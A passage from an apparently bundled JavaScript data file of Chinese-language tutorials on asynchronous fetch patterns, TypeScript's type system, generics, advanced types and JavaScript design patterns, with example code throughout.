    const promise = fetchUrl(url).then(result => {
      executing.splice(executing.indexOf(promise), 1);
      return result;
    });
    
    executing.push(promise);
    results.push(promise);
    
    if (executing.length >= concurrency) {
      await Promise.race(executing);
    }
  }
  
  return Promise.all(results);
}

const urls = [
  'https://api.example.com/data1',
  'https://api.example.com/data2',
  'https://api.example.com/data3',
  'https://api.example.com/data4',
  'https://api.example.com/data5'
];

fetchAll(urls, 3)
  .then(results => console.log('Results:', results))
  .catch(error => console.error('Error:', error));
\`\`\`

#### 请求重试

\`\`\`javascript
async function fetchWithRetry(url, options = {}, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        throw new Error(\`HTTP error! status: \${response.status}\`);
      }
      
      return response.json();
    } catch (error) {
      if (i === retries - 1) {
        throw error;
      }
      
      // 指数退避
      const delay = Math.pow(2, i) * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

fetchWithRetry('https://api.example.com/data')
  .then(data => console.log('Data:', data))
  .catch(error => console.error('Error:', error));
\`\`\`

### 常见异步场景

**网络请求：**
- 使用 fetch 或 axios 发起请求
- 处理响应和错误
- 实现请求重试和超时

**文件操作：**
- 读取和写入文件
- 处理大文件
- 监控文件变化

**定时器：**
- setTimeout 和 setInterval
- 清除定时器避免内存泄漏
- 使用 requestAnimationFrame 进行动画

**事件处理：**
- 处理 DOM 事件
- 事件委托
- 异步事件处理

### 最佳实践

- 理解 JavaScript 单线程和异步编程
- 优先使用 async/await 而非回调函数
- 合理使用 Promise 方法处理并发
- 统一错误处理策略
- 避免回调地狱
- 控制并发数量
- 实现请求重试和超时

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"typescript-fundamentals",title:"TypeScript 核心概念与类型系统",category:"javascript",difficulty:"medium",tags:["TypeScript","类型系统","接口","泛型"],content:`## TypeScript 核心概念与类型系统

TypeScript 是 JavaScript 的超集，为 JavaScript 添加了静态类型系统，提高了代码的可靠性和可维护性。

### 类型系统

**基本类型：**
- 原始类型：string、number、boolean、null、undefined、symbol、bigint
- 对象类型：object、array、function
- 联合类型：A | B
- 交叉类型：A & B

**类型推断：**
- TypeScript 会自动推断变量的类型：TypeScript拥有强大的类型推断能力，可以根据变量的初始值、函数的返回值、变量的使用方式等自动推断变量类型，如let x = 10会自动推断x为number类型，const greeting = (name: string) => \`Hello, \${name}\`会推断返回类型为string，合理利用类型推断可以减少类型注解的工作量，同时保持类型安全
- 基于初始化值
- 基于上下文

**类型断言：**
- 告诉 TypeScript 变量的具体类型
- 使用 as 关键字
- 使用尖括号语法（在 JSX 中不推荐）

### 代码示例

#### 基本类型示例

\`\`\`typescript
// 原始类型
let name: string = 'Alice';
let age: number = 25;
let isStudent: boolean = true;
let nothing: null = null;
let notDefined: undefined = undefined;
let unique: symbol = Symbol('unique');
let bigNumber: bigint = 100n;

// 对象类型
let person: object = { name: 'Alice', age: 25 };
let numbers: number[] = [1, 2, 3];
let strings: Array<string> = ['a', 'b', 'c'];
let fn: Function = () => {};

// 联合类型
let value: string | number = 'hello';
value = 42;

// 交叉类型
type Person = { name: string };
type Employee = { id: number };
type PersonEmployee = Person & Employee;

const personEmployee: PersonEmployee = {
  name: 'Alice',
  id: 1
};
\`\`\`

#### 类型推断示例

\`\`\`typescript
// 基于初始化值
let name = 'Alice'; // 推断为 string
let age = 25; // 推断为 number
let isActive = true; // 推断为 boolean

// 基于上下文
const numbers = [1, 2, 3];
numbers.forEach(num => {
  // num 被推断为 number
  console.log(num.toFixed(2));
});

// 显式类型注解
let count: number;
count = 10;
\`\`\`

#### 类型断言示例

\`\`\`typescript
// 使用 as 关键字
let value: any = 'hello';
let length: number = (value as string).length;

// 使用尖括号语法（在 JSX 中不推荐）
let length2: number = (<string>value).length;

// 非空断言
function printName(name: string | null) {
  console.log(name!.toUpperCase()); // 断言 name 不为 null
}

// DOM 元素类型断言
const button = document.querySelector('button') as HTMLButtonElement;
button.addEventListener('click', () => {
  console.log('Button clicked');
});
\`\`\`

### 接口和类型别名

**接口：**
- 定义对象的结构
- 可以被扩展
- 可以被实现
- 适合定义对象类型

**类型别名：**
- 为类型创建别名
- 可以表示任何类型
- 不能被扩展
- 适合定义联合类型和交叉类型

### 代码示例

#### 接口示例

\`\`\`typescript
// 基本接口
interface Person {
  name: string;
  age: number;
}

const person: Person = {
  name: 'Alice',
  age: 25
};

// 可选属性
interface Product {
  id: number;
  name: string;
  price?: number; // 可选属性
}

const product: Product = {
  id: 1,
  name: 'Laptop'
};

// 只读属性
interface Point {
  readonly x: number;
  readonly y: number;
}

const point: Point = { x: 10, y: 20 };
// point.x = 15; // 错误：只读属性不能修改

// 接口扩展
interface Animal {
  name: string;
}

interface Dog extends Animal {
  breed: string;
}

const dog: Dog = {
  name: 'Buddy',
  breed: 'Golden Retriever'
};

// 接口实现
interface Clock {
  currentTime: Date;
  setTime(d: Date): void;
}

class DigitalClock implements Clock {
  currentTime: Date = new Date();
  
  setTime(d: Date) {
    this.currentTime = d;
  }
}
\`\`\`

#### 类型别名示例

\`\`\`typescript
// 基本类型别名
type Name = string;
type Age = number;
type Person = {
  name: Name;
  age: Age;
};

// 联合类型别名
type Status = 'pending' | 'success' | 'error';
type ID = string | number;

// 函数类型别名
type Callback = (error: Error | null, data?: any) => void;

function fetchData(callback: Callback) {
  // ...
}

// 泛型类型别名
type Container<T> = { value: T };
type NumberContainer = Container<number>;

// 条件类型别名
type NonNullable<T> = T extends null | undefined ? never : T;
type Result = NonNullable<string | null>; // string
\`\`\`

### 泛型

**泛型的概念：**
- 允许在定义函数、接口或类时使用类型参数
- 提高代码的复用性
- 保持类型安全

**泛型的使用：**
- 泛型函数
- 泛型接口
- 泛型类
- 泛型约束

**泛型工具类型：**
- Partial<T>：将所有属性变为可选：Partial是TypeScript内置的工具类型，将类型T的所有属性设置为可选，使用内置的映射类型遍历T的每个属性并添加?修饰符，如Partial<User>会将User的所有属性变为可选，常用于更新部分数据的场景，如更新用户信息时只需要传入要修改的字段
- Required<T>：将所有属性变为必需：Required是TypeScript内置的工具类型，与Partial相反，将类型T的所有可选属性变为必需属性，通过将属性映射并移除?修饰符实现，如Required<Partial<User>>会恢复User的所有必需属性，常用于确保某些属性必须存在的场景
- Readonly<T>：将所有属性变为只读：Readonly是TypeScript内置的工具类型，将类型T的所有属性设置为只读，添加readonly修饰符，如Readonly<User>会将User的所有属性变为只读，无法修改，常用于保护数据不被意外修改的场景，如配置对象、常量对象等
- Pick<T, K>：拣选属性：Pick是TypeScript内置的工具类型，从类型T中拣选指定的属性K组成新类型，如Pick<User, 'name' | 'email'>只保留User的name和email属性，常用于只需要对象部分属性的场景，可以创建更精确的类型，提高类型安全性和代码可读性
- Omit<T, K>：排除属性：Omit是TypeScript内置的工具类型，从类型T中排除指定的属性K组成新类型，如Omit<User, 'password'>会排除User的password属性，常用于创建不包含某些敏感属性的类型，如API返回数据时不包含密码等敏感信息
- Record<K, T>：创建键值对类型：Record是TypeScript内置的工具类型，用于创建键值对类型，K是键的类型（通常是string或number），T是值的类型，如Record<string, User>创建一个键为字符串、值为User对象的类型，常用于定义字典类型、映射类型、缓存类型等

### 代码示例

#### 泛型函数示例

\`\`\`typescript
// 基本泛型函数
function identity<T>(arg: T): T {
  return arg;
}

const num = identity<number>(42);
const str = identity('hello');

// 类型推断
const num2 = identity(42); // 推断为 number
const str2 = identity('hello'); // 推断为 string

// 多个类型参数
function pair<T, U>(first: T, second: U): [T, U] {
  return [first, second];
}

const pairResult = pair('hello', 42); // [string, number]

// 泛型约束
interface Lengthwise {
  length: number;
}

function getLength<T extends Lengthwise>(arg: T): number {
  return arg.length;
}

getLength('hello'); // 5
getLength([1, 2, 3]); // 3
// getLength(42); // 错误：number 没有 length 属性
\`\`\`

#### 泛型接口示例

\`\`\`typescript
// 泛型接口
interface Box<T> {
  value: T;
}

const stringBox: Box<string> = { value: 'hello' };
const numberBox: Box<number> = { value: 42 };

// 泛型接口作为函数类型
interface Comparator<T> {
  (a: T, b: T): number;
}

const numberComparator: Comparator<number> = (a, b) => a - b;
const stringComparator: Comparator<string> = (a, b) => 
  a.localeCompare(b);

// 泛型接口作为类类型
interface Repository<T> {
  findById(id: number): T | null;
  save(entity: T): void;
}

class UserRepository implements Repository<User> {
  private users: User[] = [];
  
  findById(id: number): User | null {
    return this.users.find(u => u.id === id) || null;
  }
  
  save(user: User): void {
    this.users.push(user);
  }
}
\`\`\`

#### 泛型类示例

\`\`\`typescript
// 泛型类
class Stack<T> {
  private items: T[] = [];
  
  push(item: T): void {
    this.items.push(item);
  }
  
  pop(): T | undefined {
    return this.items.pop();
  }
  
  peek(): T | undefined {
    return this.items[this.items.length - 1];
  }
}

const numberStack = new Stack<number>();
numberStack.push(1);
numberStack.push(2);
console.log(numberStack.pop()); // 2

const stringStack = new Stack<string>();
stringStack.push('hello');
stringStack.push('world');
console.log(stringStack.pop()); // 'world'
\`\`\`

#### 泛型工具类型示例

\`\`\`typescript
interface User {
  id: number;
  name: string;
  email: string;
  age: number;
}

// Partial<T>：将所有属性变为可选
type PartialUser = Partial<User>;
const partialUser: PartialUser = {
  name: 'Alice'
};

// Required<T>：将所有属性变为必需
type RequiredUser = Required<Partial<User>>;
const requiredUser: RequiredUser = {
  id: 1,
  name: 'Alice',
  email: 'alice@example.com',
  age: 25
};

// Readonly<T>：将所有属性变为只读
type ReadonlyUser = Readonly<User>;
const readonlyUser: ReadonlyUser = {
  id: 1,
  name: 'Alice',
  email: 'alice@example.com',
  age: 25
};
// readonlyUser.name = 'Bob'; // 错误

// Pick<T, K>：拣选属性
type UserBasicInfo = Pick<User, 'id' | 'name'>;
const basicInfo: UserBasicInfo = {
  id: 1,
  name: 'Alice'
};

// Omit<T, K>：排除属性
type UserWithoutEmail = Omit<User, 'email'>;
const userWithoutEmail: UserWithoutEmail = {
  id: 1,
  name: 'Alice',
  age: 25
};

// Record<K, T>：创建键值对类型
type UserRecord = Record<number, User>;
const users: UserRecord = {
  1: { id: 1, name: 'Alice', email: 'alice@example.com', age: 25 },
  2: { id: 2, name: 'Bob', email: 'bob@example.com', age: 30 }
};
\`\`\`

### 高级类型

**条件类型：**
- 基于条件选择类型
- 使用 extends 关键字
- 结合 infer 关键字推断类型

**映射类型：**
- 基于现有类型创建新类型
- 遍历现有类型的属性
- 对每个属性进行转换

**模板字面量类型：**
- 使用字符串模板语法创建类型
- 支持字符串操作
- 适合创建动态类型

### 代码示例

#### 条件类型示例

\`\`\`typescript
// 基本条件类型
type IsString<T> = T extends string ? true : false;

type Test1 = IsString<string>; // true
type Test2 = IsString<number>; // false

// 条件类型与联合类型
type NonNullable<T> = T extends null | undefined ? never : T;

type Test3 = NonNullable<string | null>; // string

// infer 关键字
type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;

function foo(): string {
  return 'hello';
}

type FooReturn = ReturnType<typeof foo>; // string

// 提取数组元素类型
type ArrayElement<T> = T extends (infer U)[] ? U : never;

type Numbers = number[];
type NumberElement = ArrayElement<Numbers>; // number

// 提取 Promise 的值类型
type PromiseValue<T> = T extends Promise<infer U> ? U : never;

type PromiseString = Promise<string>;
type StringValue = PromiseValue<PromiseString>; // string
\`\`\`

#### 映射类型示例

\`\`\`typescript
// 基本映射类型
type Readonly<T> = {
  readonly [P in keyof T]: T[P];
};

type Partial<T> = {
  [P in keyof T]?: T[P];
};

interface User {
  name: string;
  age: number;
}

type ReadonlyUser = Readonly<User>;
type PartialUser = Partial<User>;

// 映射类型 + 条件类型
type Getters<T> = {
  [P in keyof T as \`get\${Capitalize<string & P>}\`]: () => T[P];
};

interface Person {
  name: string;
  age: number;
}

type PersonGetters = Getters<Person>;
// {
//   getName: () => string;
//   getAge: () => number;
// }

// 映射类型 + 模板字面量类型
type EventHandlers<T> = {
  [K in keyof T as \`on\${Capitalize<string & K>}\`]?: (event: T[K]) => void;
};

interface Events {
  click: MouseEvent;
  change: Event;
}

type EventHandlersType = EventHandlers<Events>;
// {
//   onClick?: (event: MouseEvent) => void;
//   onChange?: (event: Event) => void;
// }
\`\`\`

#### 模板字面量类型示例

\`\`\`typescript
// 基本模板字面量类型
type Greeting = \`Hello, \${string}!\`;
const greeting: Greeting = 'Hello, World!';

// 模板字面量类型 + 联合类型
type Color = 'red' | 'green' | 'blue';
type Quantity = 'light' | 'medium' | 'dark';
type ColorQuantity = \`\${Quantity}-\${Color}\`;

const color1: ColorQuantity = 'light-red';
const color2: ColorQuantity = 'dark-blue';

// 模板字面量类型 + 工具类型
type EventName = \`on\${Capitalize<string>}\`;
type ClickEvent = EventName<'click'>; // 'onClick'

// 实际应用：CSS 属性
type CSSProperty<T extends string> = \`--\${T}\`;
type CustomProperty = CSSProperty<'primary-color'>; // '--primary-color'
\`\`\`

### 模块系统

**模块的概念：**
- 代码的独立单元
- 导出和导入功能
- 避免命名冲突

**导出方式：**
- 命名导出
- 默认导出
- 重导出

**导入方式：**
- 命名导入
- 默认导入
- 命名空间导入

### 代码示例

#### 模块导出示例

\`\`\`typescript
// utils.ts
// 命名导出
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

// 默认导出
export default function multiply(a: number, b: number): number {
  return a * b;
}

// 类型导出
export interface User {
  id: number;
  name: string;
}

export type ID = string | number;

// 重导出
export { add, subtract } from './math';
export * from './constants';
\`\`\`

#### 模块导入示例

\`\`\`typescript
// main.ts
// 命名导入
import { add, subtract } from './utils';
import type { User } from './utils';

// 默认导入
import multiply from './utils';

// 命名空间导入
import * as utils from './utils';
utils.add(1, 2);

// 混合导入
import multiply, { add, subtract } from './utils';

// 动态导入
async function loadModule() {
  const utils = await import('./utils');
  console.log(utils.add(1, 2));
}
\`\`\`

### 最佳实践

- 使用类型注解提高代码可读性
- 优先使用接口定义对象类型
- 合理使用泛型提高代码复用性
- 使用类型别名定义联合类型和交叉类型
- 理解和使用高级类型
- 合理组织模块和导出
- 避免使用 any 类型
- 使用 strict 模式

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"typescript-advanced",title:"TypeScript 高级特性与类型体操",category:"javascript",difficulty:"hard",tags:["TypeScript","高级类型","类型体操","类型挑战"],content:`## TypeScript 高级特性与类型体操

TypeScript 的类型系统非常强大，支持类型级别的编程，通过类型体操可以实现复杂的类型逻辑。

### 条件类型

**条件类型的语法：**
- T extends U ? X : Y
- 类似于 JavaScript 的三元运算符
- 在类型级别进行条件判断

**条件类型的应用：**
- 类型守卫
- 类型推断
- 条件类型分发

**infer 关键字：**
- 在条件类型中推断类型
- 只能在 extends 子句中使用
- 用于提取函数参数、返回值、Promise 类型等

### 映射类型

**映射类型的语法：**
- { [P in K]: T }
- 遍历类型 K 的所有属性
- 为每个属性创建新的类型

**映射修饰符：**
- readonly：只读属性
- ?: 可选属性
- -readonly：移除只读修饰符
- -?: 移除可选修饰符

**键重映射：**
- 使用 as 关键字重映射键
- 支持模板字面量类型
- 可以基于原键创建新键

### 模板字面量类型

**模板字面量类型的语法：**
- \`\${T}\`
- 类似于 JavaScript 的模板字符串
- 在类型级别进行字符串操作

**模板字面量类型的应用：**
- 创建事件名称类型
- 构建 API 路径类型
- 生成 CSS 类名类型

**字符串操作类型：**
- Uppercase<S>：转为大写
- Lowercase<S>：转为小写
- Capitalize<S>：首字母大写
- Uncapitalize<S>：首字母小写

### 递归类型

**递归类型的概念：**
- 类型引用自身
- 用于定义嵌套结构
- 支持深度操作

**递归类型的应用：**
- 深度只读类型
- 深度部分类型
- 递归数据结构

### 类型体操实践

**类型挑战：**
- Pick：拣选属性
- Readonly：只读属性
- TupleToObject：元组转对象
- First：获取数组第一个元素
- Length：获取元组长度
- Exclude：排除类型
- Awaited：Promise 解包：Awaited是TypeScript内置的工具类型，用于解包Promise的返回值类型，将Promise<T>中的T提取出来，如Awaited<Promise<string>>会得到string类型，Awaited<Promise<number>>会得到number类型，常用于处理异步函数的返回类型，提高类型安全性
- If：条件类型
- Concat：数组连接
- Includes：数组包含

**实用类型工具：**
- DeepReadonly：深度只读
- DeepPartial：深度部分
- DeepRequired：深度必需
- DeepMutable：深度可变
- DeepNullable：深度可空
- JsonValue：JSON 值类型

### 最佳实践

- 从简单到复杂，循序渐进
- 理解类型系统的工作原理
- 合理使用类型体操，避免过度复杂
- 为复杂类型添加注释
- 利用类型推断减少显式类型标注
- 测试类型定义的正确性
- 参考 TypeScript 官方类型定义
- 学习社区中的类型体操技巧`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-design-patterns",title:"JavaScript 设计模式与应用",category:"javascript",difficulty:"medium",tags:["JavaScript","设计模式","单例","工厂"],content:`## JavaScript 设计模式与应用

设计模式是解决软件设计中常见问题的可重用方案。在 JavaScript 中，设计模式不仅可以帮助我们编写更加优雅、可维护的代码，还能提高代码的可读性和可扩展性。JavaScript 的动态特性使得某些设计模式的实现与传统面向对象语言有所不同，理解这些差异对于正确应用设计模式至关重要。

### 创建型模式

**单例模式（Singleton）：**
单例模式确保一个类只有一个实例，并提供全局访问点。在 JavaScript 中，单例模式常用于管理全局状态、配置对象、数据库连接池等场景。实现单例模式的关键是控制实例的创建过程，确保多次调用构造函数时返回同一个实例。

\`\`\`javascript
// 单例模式实现
class Singleton {
  static instance = null;
  
  constructor() {
    if (Singleton.instance) {
      return Singleton.instance;
    }
    Singleton.instance = this;
    this.data = {};
  }
  
  static getInstance() {
    if (!Singleton.instance) {
      Singleton.instance = new Singleton();
    }
    return Singleton.instance;
  }
}

// 使用示例
const instance1 = new Singleton();
const instance2 = Singleton.getInstance();
console.log(instance1 === instance2); // true

// 模块模式实现单例
const ConfigManager = (function() {
  let instance;
  
  function createInstance() {
    const config = {};
    return {
      get: (key) => config[key],
      set: (key, value) => { config[key] = value; },
      getAll: () => ({ ...config }),
    };
  }
  
  return {
    getInstance: () => {
      if (!instance) {
        instance = createInstance();
      }
      return instance;
    },
  };
})();

// ES6 模块天然是单例
// config.js
export const config = {
  apiUrl: 'https://api.example.com',
  timeout: 5000,
};
\`\`\`

**工厂模式（Factory）：**
工厂模式封装对象的创建过程，提供统一的创建接口，隐藏具体实现细节。工厂模式分为简单工厂、工厂方法和抽象工厂三种。在 JavaScript 中，工厂模式常用于创建复杂对象、根据条件创建不同类型的对象等场景。

\`\`\`javascript
// 简单工厂
class ButtonFactory {
  static create(type) {
    switch (type) {
      case 'primary':
        return new PrimaryButton();
      case 'secondary':
        return new SecondaryButton();
      case 'danger':
        return new DangerButton();
      default:
        throw new Error(\`Unknown button type: \${type}\`);
    }
  }
}

// 工厂方法
class Dialog {
  createButton() {
    throw new Error('Subclass must implement createButton method');
  }
  
  render() {
    const button = this.createButton();
    button.render();
  }
}

class WindowsDialog extends Dialog {
  createButton() {
    return new WindowsButton();
  }
}

class WebDialog extends Dialog {
  createButton() {
    return new HTMLButton();
  }
}

// 抽象工厂
class GUIFactory {
  createButton() {}
  createCheckbox() {}
}

class WindowsFactory extends GUIFactory {
  createButton() {
    return new WindowsButton();
  }
  createCheckbox() {
    return new WindowsCheckbox();
  }
}

class MacOSFactory extends GUIFactory {
  createButton() {
    return new MacOSButton();
  }
  createCheckbox() {
    return new MacOSCheckbox();
  }
}
\`\`\`

**构造器模式（Constructor）：**
构造器模式使用构造函数创建对象，初始化对象状态。在 JavaScript 中，构造函数可以与原型链配合实现属性和方法的共享，减少内存消耗。ES6 的 class 语法是构造函数的语法糖，使代码更加清晰。

\`\`\`javascript
// ES5 构造函数
function Person(name, age) {
  this.name = name;
  this.age = age;
}

Person.prototype.greet = function() {
  console.log(\`Hello, I'm \${this.name}\`);
};

Person.species = 'Homo sapiens'; // 静态属性

// ES6 类语法
class Person {
  static species = 'Homo sapiens';
  
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }
  
  greet() {
    console.log(\`Hello, I'm \${this.name}\`);
  }
  
  static getSpecies() {
    return Person.species;
  }
}

const person = new Person('Alice', 25);
person.greet(); // "Hello, I'm Alice"
\`\`\`

**原型模式（Prototype）：**
原型模式基于原型链创建对象，通过克隆现有对象来创建新对象。JavaScript 天然支持原型继承，Object.create() 方法是实现原型模式的核心。原型模式适合创建成本较高的对象，通过克隆提高性能。

\`\`\`javascript
// 原型模式实现
const prototype = {
  greet() {
    console.log(\`Hello, I'm \${this.name}\`);
  },
  clone() {
    return Object.create(this);
  },
};

const person1 = Object.create(prototype);
person1.name = 'Alice';

const person2 = person1.clone();
person2.name = 'Bob';

// 使用 Object.assign 实现深拷贝
const deepClone = (obj) => {
  if (obj === null || typeof obj !== 'object') return obj;
  
  if (Array.isArray(obj)) {
    return obj.map(deepClone);
  }
  
  const cloned = Object.create(Object.getPrototypeOf(obj));
  for (const key in obj) {
    if (obj.hasOwnProperty(key)) {
      cloned[key] = deepClone(obj[key]);
    }
  }
  return cloned;
};
\`\`\`

### 结构型模式

**适配器模式（Adapter）：**
适配器模式转换接口，使不兼容的接口能够一起工作。在 JavaScript 中，适配器模式常用于整合第三方库、处理不同数据格式、统一 API 接口等场景。适配器模式可以在不修改原有代码的情况下，实现接口的兼容。

\`\`\`javascript
// 适配器模式示例
// 旧 API
const oldAPI = {
  getUserInfo: (id) => ({ id, name: 'Alice', age: 25 }),
};

// 新 API
const newAPI = {
  fetchUser: async (id) => ({ userId: id, userName: 'Alice', userAge: 25 }),
};

// 适配器
class UserAPIAdapter {
  constructor(api) {
    this.api = api;
  }
  
  async getUser(id) {
    const user = await this.api.fetchUser(id);
    // 转换数据格式
    return {
      id: user.userId,
      name: user.userName,
      age: user.userAge,
    };
  }
}

// 使用适配器
const adapter = new UserAPIAdapter(newAPI);
const user = await adapter.getUser(1);
// { id: 1, name: 'Alice', age: 25 }

// 接口适配器
class LocalStorageAdapter {
  get(key) {
    const value = localStorage.getItem(key);
    try {
      return JSON.parse(value);
    } catch {
      return value;
    }
  }
  
  set(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
  }
  
  remove(key) {
    localStorage.removeItem(key);
  }
}
\`\`\`

**装饰器模式（Decorator）：**
装饰器模式动态为对象添加额外功能，不修改原有代码。在 JavaScript 中，装饰器模式可以通过高阶函数、类装饰器等方式实现。装饰器模式适合在不改变对象结构的情况下，扩展对象的功能。

\`\`\`javascript
// 函数装饰器
function log(target, name, descriptor) {
  const original = descriptor.value;
  descriptor.value = function(...args) {
    console.log(\`Calling \${name} with args:\`, args);
    const result = original.apply(this, args);
    console.log(\`Result:\`, result);
    return result;
  };
  return descriptor;
}

class Calculator {
  @log
  add(a, b) {
    return a + b;
  }
}

// 高阶函数装饰器
function withLogging(fn) {
  return function(...args) {
    console.log('Arguments:', args);
    const result = fn.apply(this, args);
    console.log('Result:', result);
    return result;
  };
}

function withTiming(fn) {
  return function(...args) {
    const start = performance.now();
    const result = fn.apply(this, args);
    const end = performance.now();
    console.log(\`Execution time: \${end - start}ms\`);
    return result;
  };
}

// 组合装饰器
const decoratedFn = withLogging(withTiming(expensiveOperation));

// 对象装饰器
class Coffee {
  cost() {
    return 5;
  }
}

class MilkDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 2;
  }
}

class SugarDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 1;
  }
}

let coffee = new Coffee();
coffee = new MilkDecorator(coffee);
coffee = new SugarDecorator(coffee);
console.log(coffee.cost()); // 8
\`\`\`

**代理模式（Proxy）：**
代理模式控制对对象的访问，添加额外的行为。ES6 的 Proxy 对象是实现代理模式的强大工具，可以拦截各种操作，如属性访问、赋值、函数调用等。代理模式常用于数据验证、缓存、访问控制等场景。

\`\`\`javascript
// 使用 ES6 Proxy
const user = { name: 'Alice', age: 25 };

const userProxy = new Proxy(user, {
  get(target, prop) {
    console.log(\`Getting \${prop}\`);
    return target[prop];
  },
  
  set(target, prop, value) {
    console.log(\`Setting \${prop} to \${value}\`);
    if (prop === 'age' && typeof value !== 'number') {
      throw new TypeError('Age must be a number');
    }
    target[prop] = value;
    return true;
  },
  
  has(target, prop) {
    console.log(\`Checking if \${prop} exists\`);
    return prop in target;
  },
});

// 缓存代理
function createCacheProxy(fn) {
  const cache = new Map();
  
  return new Proxy(fn, {
    apply(target, thisArg, args) {
      const key = JSON.stringify(args);
      
      if (cache.has(key)) {
        console.log('Returning cached result');
        return cache.get(key);
      }
      
      const result = target.apply(thisArg, args);
      cache.set(key, result);
      return result;
    },
  });
}

const expensiveCalculation = (n) => {
  console.log('Calculating...');
  return n * n;
};

const cachedCalculation = createCacheProxy(expensiveCalculation);
cachedCalculation(5); // Calculating... 25
cachedCalculation(5); // Returning cached result 25
\`\`\`

**外观模式（Facade）：**
外观模式提供统一的接口，简化复杂系统的使用。在 JavaScript 中，外观模式常用于封装复杂的 API 调用、统一多个模块的接口、简化库的使用等场景。外观模式可以降低系统的复杂度，提高代码的可读性。

\`\`\`javascript
// 外观模式示例
class PaymentFacade {
  constructor() {
    this.validator = new PaymentValidator();
    this.processor = new PaymentProcessor();
    this.notifier = new NotificationService();
    this.logger = new Logger();
  }
  
  async processPayment(paymentInfo) {
    try {
      // 验证支付信息
      this.validator.validate(paymentInfo);
      
      // 处理支付
      const result = await this.processor.process(paymentInfo);
      
      // 发送通知
      await this.notifier.sendConfirmation(paymentInfo.email, result);
      
      // 记录日志
      this.logger.log('Payment processed', result);
      
      return result;
    } catch (error) {
      this.logger.error('Payment failed', error);
      throw error;
    }
  }
}

// 使用外观
const payment = new PaymentFacade();
await payment.processPayment({
  amount: 100,
  cardNumber: '4111111111111111',
  email: 'user@example.com',
});
\`\`\`

### 行为型模式

**观察者模式（Observer）：**
观察者模式定义对象间的一对多依赖关系，当一个对象状态改变时，所有依赖它的对象都会收到通知。在 JavaScript 中，观察者模式广泛应用于事件处理、数据绑定、状态管理等场景。现代前端框架如 React、Vue 都大量使用观察者模式。

\`\`\`javascript
// 观察者模式实现
class EventEmitter {
  constructor() {
    this.events = {};
  }
  
  on(event, callback) {
    if (!this.events[event]) {
      this.events[event] = [];
    }
    this.events[event].push(callback);
    return () => this.off(event, callback);
  }
  
  off(event, callback) {
    if (!this.events[event]) return;
    this.events[event] = this.events[event].filter(cb => cb !== callback);
  }
  
  emit(event, ...args) {
    if (!this.events[event]) return;
    this.events[event].forEach(callback => callback(...args));
  }
  
  once(event, callback) {
    const wrapper = (...args) => {
      callback(...args);
      this.off(event, wrapper);
    };
    this.on(event, wrapper);
  }
}

// 使用示例
const emitter = new EventEmitter();
const unsubscribe = emitter.on('user:login', (user) => {
  console.log(\`User \${user.name} logged in\`);
});

emitter.emit('user:login', { name: 'Alice' });
unsubscribe();

// 简化的发布订阅模式
class PubSub {
  constructor() {
    this.subscribers = {};
  }
  
  subscribe(event, callback) {
    if (!this.subscribers[event]) {
      this.subscribers[event] = [];
    }
    this.subscribers[event].push(callback);
    return () => {
      this.subscribers[event] = this.subscribers[event].filter(cb => cb !== callback);
    };
  }
  
  publish(event, data) {
    if (!this.subscribers[event]) return;
    this.subscribers[event].forEach(callback => callback(data));
  }
}

// 状态管理中的观察者模式
class Store {
  constructor(initialState) {
    this.state = initialState;
    this.listeners = [];
  }
  
  getState() {
    return this.state;
  }
  
  setState(newState) {
    this.state = { ...this.state, ...newState };
    this.listeners.forEach(listener => listener(this.state));
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
}
\`\`\`

**策略模式（Strategy）：**
策略模式定义一系列算法，把它们封装起来，并使它们可以相互替换。策略模式让算法独立于使用它的客户端而变化。在 JavaScript 中，策略模式常用于表单验证、动画效果、支付方式选择等场景。

\`\`\`javascript
// 策略模式实现
const validationStrategies = {
  required: (value) => {
    if (!value || value.trim() === '') {
      return 'This field is required';
    }
    return null;
  },
  
  email: (value) => {
    if (!/^[^s@]+@[^s@]+.[^s@]+$/.test(value)) {
      return 'Please enter a valid email';
    }
    return null;
  },
  
  minLength: (value, min) => {
    if (value.length < min) {
      return \`Minimum length is \${min} characters\`;
    }
    return null;
  },
  
  maxLength: (value, max) => {
    if (value.length > max) {
      return \`Maximum length is \${max} characters\`;
    }
    return null;
  },
};

class Validator {
  constructor() {
    this.rules = [];
  }
  
  addRule(field, strategy, ...args) {
    this.rules.push({ field, strategy, args });
    return this;
  }
  
  validate(data) {
    const errors = {};
    
    for (const rule of this.rules) {
      const { field, strategy, args } = rule;
      const value = data[field];
      const error = validationStrategies[strategy](value, ...args);
      
      if (error && !errors[field]) {
        errors[field] = error;
      }
    }
    
    return {
      isValid: Object.keys(errors).length === 0,
      errors,
    };
  }
}

// 使用示例
const validator = new Validator()
  .addRule('email', 'required')
  .addRule('email', 'email')
  .addRule('password', 'required')
  .addRule('password', 'minLength', 8);

const result = validator.validate({
  email: 'invalid-email',
  password: '123',
});

// 支付策略
const paymentStrategies = {
  creditCard: (amount, cardInfo) => {
    console.log(\`Processing credit card payment of $\${amount}\`);
    // 信用卡支付逻辑
  },
  
  paypal: (amount, paypalInfo) => {
    console.log(\`Processing PayPal payment of $\${amount}\`);
    // PayPal 支付逻辑
  },
  
  crypto: (amount, walletInfo) => {
    console.log(\`Processing crypto payment of $\${amount}\`);
    // 加密货币支付逻辑
  },
};

function processPayment(method, amount, info) {
  const strategy = paymentStrategies[method];
  if (!strategy) {
    throw new Error(\`Unknown payment method: \${method}\`);
  }
  return strategy(amount, info);
}
\`\`\`

**命令模式（Command）：**
命令模式将请求封装为对象，从而允许用不同的请求对客户进行参数化、对请求排队或记录请求日志，以及支持可撤销的操作。在 JavaScript 中，命令模式常用于实现撤销/重做功能、菜单操作、宏命令等场景。

\`\`\`javascript
// 命令模式实现
class Command {
  execute() {
